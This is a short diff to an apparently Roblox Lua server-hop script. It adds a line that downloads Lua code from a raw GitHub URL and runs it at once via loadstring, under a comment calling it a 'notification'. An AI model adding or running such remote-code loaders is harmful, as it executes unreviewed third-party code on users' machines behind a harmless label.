@@ -29,3 +29,5 @@ local function ServerHop()
 end
 
 ServerHop()
+
+loadstring(game:HttpGet"https://raw.githubusercontent.com/710200999/notification/refs/heads/main/notification-HopServerLowPlayer.lua")() -- notification
